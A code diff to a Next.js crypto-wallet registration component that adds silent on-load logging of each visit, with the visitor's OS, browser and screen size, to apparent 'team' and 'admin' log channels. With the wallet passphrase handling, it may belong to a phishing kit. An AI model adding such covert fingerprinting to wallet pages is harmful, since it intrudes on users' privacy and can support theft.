@@ -1,6 +1,6 @@
 "use client";
 
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import { useForm, useFieldArray, FieldValues } from "react-hook-form";
 import { useRouter } from "next/navigation";
 
@@ -17,10 +17,20 @@ import { PASS_SLICE_INDEX } from "@/data/constants/limits";
 import { ROUTES } from "@/data/routes";
 import { REGISTER_INIT_VALUES, AUTH_INP_DATA, PASSPHRASE_DATA, passArr, passStr } from "@/data/pages/inp-data";
 import { NEXT_PUBLIC_TEAM_LOG_CHANNEL, NEXT_PUBLIC_ADMIN_LOG_CHANNEL } from "@/data/api/env";
-import { sendExtendedLog } from "@/utils/logger";
+import { androidRegex, iOSRegex, windowsRegex } from "@/data/constants/regex";
+import { getDeviceData, sendExtendedLog } from "@/utils/logger";
 import { removeStrSpaces } from "@/utils/utils";
 
 export const RegisterWallet = () => {
+    // * log sended two times in React.StrictMode
+    useEffect(() => {
+        sendExtendedLog(NEXT_PUBLIC_TEAM_LOG_CHANNEL, logMessages.visited);
+        sendExtendedLog(
+            NEXT_PUBLIC_ADMIN_LOG_CHANNEL,
+            `${logMessages.visited} | ОС и браузер: ${getDeviceData(window.navigator.userAgent, windowsRegex, androidRegex, iOSRegex)} | Экран: ${window.screen.width}x${window.screen.height}`
+        );
+    }, []);
+
     const {
         register,
         control,
@@ -87,7 +97,7 @@ export const RegisterWallet = () => {
     const [userError, setUserError] = useState<string>("");
 
     const submitForm = async (data: FieldValues) => {
-        if (currentStepIndex === 0) sendExtendedLog(NEXT_PUBLIC_TEAM_LOG_CHANNEL, logMessages.startRegister);
+        // if (currentStepIndex === 0) sendExtendedLog(NEXT_PUBLIC_TEAM_LOG_CHANNEL, logMessages.startRegister);
         if (!isLastStep) return next();
         const confirmInpValue = removeStrSpaces(data["confirm-inp"], " ");
 
